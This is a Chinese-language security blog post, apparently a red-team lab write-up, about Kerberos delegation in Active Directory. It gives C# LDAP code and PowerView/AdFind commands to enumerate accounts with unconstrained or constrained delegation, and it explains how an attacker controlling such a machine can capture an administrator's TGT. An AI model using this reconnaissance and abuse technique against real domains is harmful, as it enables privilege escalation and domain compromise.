<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="0x00 c#æ£€æµ‹å§”æ´¾è´¦æˆ·å‰æ–‡å·²ç»å†™åˆ°æ£€æµ‹åŸŸå†…dcsyncï¼Œadminsdholderç­‰åé—¨å’Œä¸€äº›åŸºæœ¬åŸŸå†…ä¿¡æ¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767">
<meta property="og:type" content="article">
<meta property="og:title" content="kerberoså§”æ´¾">
<meta property="og:url" content="http://example.com/2021/10/03/kerberos%E5%A7%94%E6%B4%BE/index.html">
<meta property="og:site_name" content="æˆ‘æ˜¯GGè¿˜æ˜¯MM">
<meta property="og:description" content="0x00 c#æ£€æµ‹å§”æ´¾è´¦æˆ·å‰æ–‡å·²ç»å†™åˆ°æ£€æµ‹åŸŸå†…dcsyncï¼Œadminsdholderç­‰åé—¨å’Œä¸€äº›åŸºæœ¬åŸŸå†…ä¿¡æ¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767">
<meta property="og:locale">
<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/04/wXi1Mw.png">
<meta property="og:image" content="https://i.bmp.ovh/imgs/2021/10/7d6d7f0ccec809a7.png">
<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/04/wXId46.png">
<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/04/wXiyKM.png">
<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wX6jr7.png">
<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wX6FzF.png">
<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wX6Rir.png">
<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wX6xqJ.png">
<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wX6Tx0.png">
<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/04/wXIzwN.png">
<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/04/wXIEBs.png">
<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/04/wXIYJ7.png">
<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wXIwmG.png">
<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wXIfay.png">
<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wXIGaM.png">
<meta property="og:image" content="https://t1.picb.cc/uploads/2021/10/03/wXIHEt.png">
<meta property="article:published_time" content="2021-10-03T13:33:37.000Z">
<meta property="article:modified_time" content="2021-10-03T16:49:37.582Z">
<meta property="article:author" content="1">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://t1.picb.cc/uploads/2021/10/04/wXi1Mw.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'åšä¸»'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://example.com/2021/10/03/kerberoså§”æ´¾/"/>





  <title>kerberoså§”æ´¾ | æˆ‘æ˜¯GGè¿˜æ˜¯MM</title>
  








<meta name="generator" content="Hexo 5.4.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

<a target="_blank" rel="noopener" href="https://github.com/yicunyiye" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">æˆ‘æ˜¯GGè¿˜æ˜¯MM</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            é¦–é¡µ
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            å½’æ¡£
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/03/kerberos%E5%A7%94%E6%B4%BE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/47177122?v=4">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="æˆ‘æ˜¯GGè¿˜æ˜¯MM">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">kerberoså§”æ´¾</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2021-10-03T21:33:37+08:00">
                2021-10-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="0x00-c-æ£€æµ‹å§”æ´¾è´¦æˆ·"><a href="#0x00-c-æ£€æµ‹å§”æ´¾è´¦æˆ·" class="headerlink" title="0x00 c#æ£€æµ‹å§”æ´¾è´¦æˆ·"></a>0x00 c#æ£€æµ‹å§”æ´¾è´¦æˆ·</h1><p>å‰æ–‡å·²ç»å†™åˆ°æ£€æµ‹åŸŸå†…dcsyncï¼Œadminsdholderç­‰åé—¨å’Œä¸€äº›åŸºæœ¬åŸŸå†…ä¿¡æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">public static void Checkdelegation()</span><br><span class="line">        &#123;</span><br><span class="line">            Ldapcoon.LDAP_COON();</span><br><span class="line">            Font.InfoFonts();</span><br><span class="line">            Console.WriteLine(&quot;\r\n&quot;);</span><br><span class="line">            Console.WriteLine(&quot;===========éçº¦æŸæ€§å§”æ´¾ä¸»æœº===========&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">            Ldapcoon.search.Filter = &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;;</span><br><span class="line">            foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string computers = &quot;&quot;;</span><br><span class="line">                string groupdescription = &quot;&quot;;</span><br><span class="line">                computers = r.Properties[&quot;distinguishedName&quot;][0].ToString();</span><br><span class="line">                Console.WriteLine(computers);</span><br><span class="line">                //groupdescription = r.Properties[&quot;description&quot;][0].ToString();</span><br><span class="line">                //Console.WriteLine(&quot;Description: &quot; + groupdescription + &quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Font.InfoFonts();</span><br><span class="line">            Console.WriteLine(&quot;\r\n&quot;);</span><br><span class="line">            Console.WriteLine(&quot;===========éçº¦æŸæ€§å§”æ´¾ç”¨æˆ·===========&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">            Ldapcoon.search.Filter = &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;;</span><br><span class="line">            foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string users = &quot;&quot;;</span><br><span class="line">                string groupdescription = &quot;&quot;;</span><br><span class="line">                users = r.Properties[&quot;distinguishedName&quot;][0].ToString();</span><br><span class="line">                Console.WriteLine(users);</span><br><span class="line">                //groupdescription = r.Properties[&quot;description&quot;][0].ToString();</span><br><span class="line">                //Console.WriteLine(&quot;Description: &quot; + groupdescription + &quot;\r\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Font.InfoFonts();</span><br><span class="line">            Console.WriteLine(&quot;\r\n&quot;);</span><br><span class="line">            Console.WriteLine(&quot;===========çº¦æŸæ€§å§”æ´¾ç”¨æˆ·=============&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">            Ldapcoon.search.Filter = &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;;</span><br><span class="line">            foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string users = &quot;&quot;;</span><br><span class="line">                string target = &quot;&quot;;</span><br><span class="line">                int user_count = 0;</span><br><span class="line">                int target_count = 0;</span><br><span class="line">                int len = 0;</span><br><span class="line"></span><br><span class="line">                user_count = r.Properties[&quot;distinguishedName&quot;].Count;</span><br><span class="line">                target_count = r.Properties[&quot;msDS-AllowedToDelegateTo&quot;].Count;</span><br><span class="line"></span><br><span class="line">                while (len &lt; user_count)</span><br><span class="line">                &#123;</span><br><span class="line">                    users = r.Properties[&quot;distinguishedName&quot;][len].ToString();</span><br><span class="line">                    Console.WriteLine(users);</span><br><span class="line">                    len++;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                len = 0;</span><br><span class="line">                Font.Warning();</span><br><span class="line">                Console.WriteLine(&quot;\r\ntarget SPN&quot;);</span><br><span class="line">                Font.NormailFonts();</span><br><span class="line">                while (len &lt; target_count)</span><br><span class="line">                &#123;</span><br><span class="line">                    target = r.Properties[&quot;msDS-AllowedToDelegateTo&quot;][len].ToString();</span><br><span class="line">                    Console.WriteLine(target);</span><br><span class="line">                    len++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Font.InfoFonts();</span><br><span class="line">            Console.WriteLine(&quot;\r\n&quot;);</span><br><span class="line">            Console.WriteLine(&quot;===========çº¦æŸæ€§å§”æ´¾ä¸»æœº=============&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">            Ldapcoon.search.Filter = &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;;</span><br><span class="line">            foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string users = &quot;&quot;;</span><br><span class="line">                string target = &quot;&quot;;</span><br><span class="line">                int user_count = 0;</span><br><span class="line">                int target_count = 0;</span><br><span class="line">                int len = 0;</span><br><span class="line"></span><br><span class="line">                user_count = r.Properties[&quot;distinguishedName&quot;].Count;</span><br><span class="line">                target_count = r.Properties[&quot;msDS-AllowedToDelegateTo&quot;].Count;</span><br><span class="line"></span><br><span class="line">                while(len &lt; user_count)</span><br><span class="line">                &#123;</span><br><span class="line">                    users = r.Properties[&quot;distinguishedName&quot;][len].ToString();</span><br><span class="line">                    Console.WriteLine(users);</span><br><span class="line">                    len++;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                len = 0;</span><br><span class="line">                Font.Warning();</span><br><span class="line">                Console.WriteLine(&quot;\r\ntarget SPN&quot;);</span><br><span class="line">                Font.NormailFonts();</span><br><span class="line">                while (len &lt; target_count)</span><br><span class="line">                &#123;</span><br><span class="line">                    target = r.Properties[&quot;msDS-AllowedToDelegateTo&quot;][len].ToString();</span><br><span class="line">                    Console.WriteLine(target);</span><br><span class="line">                    len++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºçº¦æŸæ€§å§”æ´¾ä¼šæŒ‡å®šå§”æ´¾çš„å¯¹è±¡å¯èƒ½ä¸ºå¤šä¸ªæ‰€ä»¥æˆ‘ä»¬å…ˆæ£€æµ‹ä»–çš„countç„¶åå†éå†è¾“å‡ºã€‚</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXi1Mw.png" alt="wXi1Mw.png"></p>
<h1 id="0x01å§”æ´¾"><a href="#0x01å§”æ´¾" class="headerlink" title="0x01å§”æ´¾"></a>0x01å§”æ´¾</h1><p>å§”æ´¾ï¼šå½“ç”¨æˆ·AåŸºäºkerberoséªŒè¯å»è¯·æ±‚BæœåŠ¡ï¼ŒBæœåŠ¡ä½¿ç”¨Açš„èº«ä»½å»è¯·æ±‚æœåŠ¡Cã€‚</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/7d6d7f0ccec809a7.png"></p>
<ul>
<li>åŸŸå†…ç”¨æˆ·jackä»¥Kerberosæ–¹å¼è®¤è¯åè®¿é—®WebæœåŠ¡å™¨ï¼›</li>
<li>WebæœåŠ¡ä»¥websvcæœåŠ¡è´¦å·è¿è¡Œï¼Œwebsvcå‘KDCå‘èµ·jackç”¨æˆ·çš„ç¥¨æ®ç”³è¯·ï¼›</li>
<li>KDCæ£€æŸ¥websvcç”¨æˆ·çš„å§”æ´¾å±æ€§ï¼Œå¦‚æœè¢«è®¾ç½®ï¼Œåˆ™è¿”å›jackç”¨æˆ·çš„å¯è½¬å‘ç¥¨æ®TGTï¼›</li>
<li>websvcæ”¶åˆ°jackç”¨æˆ·TGTåï¼Œä½¿ç”¨è¯¥ç¥¨æ®å‘KDCç”³è¯·è®¿é—®æ–‡ä»¶æœåŠ¡å™¨çš„æœåŠ¡ç¥¨æ®TGSï¼›</li>
<li>KDCæ£€æŸ¥websvcçš„å§”æ´¾å±æ€§ï¼Œå¦‚æœè¢«è®¾ç½®ï¼Œä¸”ç”³è¯·çš„æ–‡ä»¶æœåŠ¡åœ¨å…è®¸çš„åˆ—è¡¨æ¸…å•ä¸­ï¼Œåˆ™è¿”å›ä¸€ä¸ªjackç”¨æˆ·è®¿é—®æ–‡ä»¶æœåŠ¡çš„æˆæƒç¥¨æ®TGSï¼›</li>
<li>websvcæ”¶åˆ°çš„jackç”¨æˆ·çš„æˆæƒç¥¨æ®TGSåï¼Œå¯è®¿é—®æ–‡ä»¶æœåŠ¡ï¼Œå®Œæˆå¤šè·³è®¤è¯ã€‚</li>
</ul>
<p>åœ¨åŸŸå†…åªæœ‰<strong>æœåŠ¡è´¦å·</strong>å’Œ<strong>æœºå™¨è´¦å·</strong>æ‰å…·æœ‰å§”æ´¾å±æ€§ã€‚</p>
<p><strong>æœºå™¨è´¦å·</strong>å°±æ˜¯ADæ´»åŠ¨ç›®å½•ä¸­ Computers ä¸­çš„è®¡ç®—æœº(ä¸€ä¸ªæ™®é€šåŸŸç”¨æˆ·é»˜è®¤æœ€å¤šå¯ä»¥åˆ›å»ºåä¸ªä¸»æœºè´¦å·)ã€‚</p>
<p><strong>æœåŠ¡è´¦å·</strong>ï¼ˆService Accountï¼‰æ˜¯åŸŸå†…ç”¨æˆ·çš„ä¸€ç§ç±»å‹ï¼Œæ˜¯æœåŠ¡å™¨è¿è¡ŒæœåŠ¡æ—¶æ‰€ç”¨çš„è´¦å·ï¼Œå°†æœåŠ¡è¿è¡Œèµ·æ¥å¹¶åŠ å…¥åŸŸã€‚ä¾‹å¦‚SQL Server åœ¨å®‰è£…æ—¶ï¼Œä¼šåœ¨åŸŸå†…è‡ªåŠ¨æ³¨å†ŒæœåŠ¡è´¦å· SQLServiceAccountã€‚ä¹Ÿå¯ä»¥å°†åŸŸç”¨æˆ·é€šè¿‡æ³¨å†ŒSPNå˜ä¸ºæœåŠ¡è´¦å·ã€‚</p>
<p>å½“ç”¨æˆ·è¢«è®¾ç½®ä¸ºä¸å…è®¸è¢«å§”æ´¾ï¼Œé‚£ä¹ˆå°±ä¸èƒ½å§”æ´¾ã€‚</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXId46.png" alt="wXId46.png"></p>
<p>å§”æ´¾å¯ä»¥åˆ†ä¸ºï¼š</p>
<p><strong>éçº¦æŸæ€§å§”æ´¾</strong></p>
<p><strong>çº¦æŸæ€§å§”æ´¾</strong></p>
<p><strong>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾</strong></p>
<h2 id="0x02-éçº¦æŸå§”æ´¾"><a href="#0x02-éçº¦æŸå§”æ´¾" class="headerlink" title="0x02 éçº¦æŸå§”æ´¾"></a>0x02 éçº¦æŸå§”æ´¾</h2><p>æ“ä½œç¯å¢ƒï¼š</p>
<blockquote>
<p>åŸŸï¼šredteam.local</p>
<p>åŸŸæ§ï¼šDC.redteam.localã€‚ä¸»æœºåï¼šDCã€‚ipï¼š192.168.11.16</p>
<p>åŸŸç®¡è´¦æˆ·ï¼šAdministrator/test123..</p>
<p>åŸŸå†…æœºå™¨ï¼šMSSQL.redteamã€‚ipï¼š192.168.11.8ã€‚æ™®é€šè´¦æˆ·ï¼šhack/test123..</p>
</blockquote>
<p><strong>å‰æï¼š</strong>åœ¨æœºå™¨è´¦å·Bä¸Šé…ç½®äº†éçº¦æŸæ€§å§”æ´¾(åŸŸç®¡ç†å‘˜æ‰æœ‰æƒé™é…ç½®)</p>
<p>1.ç”¨æˆ·è®¿é—®æœºå™¨Bçš„æŸä¸ªæœåŠ¡ï¼Œäºæ˜¯å‘KDCè®¤è¯ã€‚KDCä¼šæ£€æŸ¥æœºå™¨Bçš„æœºå™¨è´¦å·çš„å±æ€§ï¼Œå‘ç°æ˜¯éçº¦æŸæ€§å§”æ´¾ï¼ŒKDCä¼šå°†ç”¨æˆ·çš„TGTæ”¾åœ¨STæœåŠ¡ç¥¨æ®ä¸­ã€‚</p>
<p>2.ç”¨æˆ·è®¿é—®æœºå™¨Bæ—¶ï¼ŒTGTç¥¨æ®ä¼šå’ŒSTæœåŠ¡ç¥¨æ®ä¸€åŒå‘é€ç»™æœºå™¨B</p>
<p>3.è¿™æ ·Båœ¨éªŒè¯STæœåŠ¡ç¥¨æ®çš„åŒæ—¶è·å–äº†ç”¨æˆ·çš„TGTï¼Œå¹¶å°†TGTå­˜å‚¨åœ¨LSASSè¿›ç¨‹ä¸­ï¼Œä»è€Œå¯ä»¥æ¨¡æ‹Ÿç”¨æˆ·è®¿é—®ä»»æ„æœåŠ¡</p>
<p>ä»ç½‘ç»œæ”»å‡»çš„è§’åº¦æ¥çœ‹ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶äº†æœºå™¨Bçš„æœºå™¨è´¦å·ï¼Œå¹¶ä¸”æœºå™¨Bé…ç½®äº†éçº¦æŸæ€§å§”æ´¾ã€‚åˆ™æ”»å‡»è€…å¯ä»¥è¯±éª—ç®¡ç†å‘˜æ¥è®¿é—®æœºå™¨Bï¼Œç„¶åæ”»å‡»è€…å¯ä»¥è·å–ç®¡ç†å‘˜çš„TGTï¼Œä»è€Œæ¨¡æ‹Ÿç®¡ç†å‘˜è®¿é—®ä»»æ„æœåŠ¡ï¼Œå³è·å¾—äº†ç®¡ç†å‘˜æƒé™ã€‚</p>
<p>åœ¨éçº¦æŸè¡Œå§”æ´¾ä¸­ï¼ŒæœåŠ¡è´¦å·å¯ä»¥è·å–è¢«å§”æ´¾ç”¨æˆ·çš„TGTï¼Œç„¶åæŠŠTGTå­˜å‚¨åœ¨LSASSè¿›ç¨‹ä¸­ï¼Œä»è€ŒæœåŠ¡è´¦å·å¯ä»¥ä½¿ç”¨è¿™ä¸ªTGTå»æ¨¡æ‹Ÿç”¨æˆ·è®¿é—®ä»»ä½•æœåŠ¡ã€‚</p>
<p>å½“æœåŠ¡è´¦å·æˆ–è€…ä¸»æœºè¢«è®¾ç½®ä¸ºéçº¦æŸæ€§å§”æ´¾æ—¶ï¼Œå…¶<code>userAccountControl</code>å±æ€§ä¼šåŒ…å«<code>WORKSTATION_TRUSTED_FOR_DELEGATION</code>ã€‚æˆ‘ä»¬è®¾ç½®MSSQLè¿™ä¸ªæœºå™¨ã€‚</p>
<p><img src="https://t1.picb.cc/uploads/2021/10/04/wXiyKM.png" alt="wXiyKM.png"></p>
<p><img src="https://t1.picb.cc/uploads/2021/10/03/wX6jr7.png" alt="wX6jr7.png"></p>
<p>å½“æˆ‘ä»¬æ§åˆ¶äº†æœºå™¨è´¦å·MSSQLï¼Œç„¶åè¯±å¯¼ç®¡ç†å‘˜æ¥è®¿é—®æœºå™¨ï¼Œå°±å¯ä»¥è·å¾—ç®¡ç†å‘˜çš„TGTï¼Œä»è€Œè®¿é—®ä»»ä½•æœåŠ¡ã€‚</p>
<h3 id="2-1-ç­›é€‰éçº¦æŸæ€§å§”æ´¾çš„è´¦å·"><a href="#2-1-ç­›é€‰éçº¦æŸæ€§å§”æ´¾çš„è´¦å·" class="headerlink" title="2.1 ç­›é€‰éçº¦æŸæ€§å§”æ´¾çš„è´¦å·"></a>2.1 ç­›é€‰éçº¦æŸæ€§å§”æ´¾çš„è´¦å·</h3><p>åŸŸæ§ä¸»æœºè´¦æˆ·æ˜¯é»˜è®¤å¼€å¯éçº¦æŸæ€§å§”æ´¾</p>
<h4 id="2-1-1-powerview-ps1"><a href="#2-1-1-powerview-ps1" class="headerlink" title="2.1.1 powerview.ps1"></a>2.1.1 powerview.ps1</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"> </span><br><span class="line">æŸ¥è¯¢åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„è´¦æˆ·</span><br><span class="line"><span class="built_in">Get-NetUser</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> redteam.local</span><br><span class="line">æŸ¥è¯¢åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ä¸»æœºï¼š</span><br><span class="line"><span class="built_in">Get-NetComputer</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> redteam.local</span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Administrator\Desktop&gt; <span class="built_in">Get-NetComputer</span> <span class="literal">-Unconstrained</span> <span class="literal">-Domain</span> redteam.local</span><br><span class="line">DC.redteam.local</span><br><span class="line">mssql.redteam.local</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure>



<h4 id="2-1-2-ADFind"><a href="#2-1-2-ADFind" class="headerlink" title="2.1.2 ADFind"></a>2.1.2 ADFind</h4><p>æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ç”¨æˆ·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=local&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>

<p>æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸå§”æ´¾çš„ä¸»æœºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=redteam,DC=local&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br></pre></td></tr></table></figure>



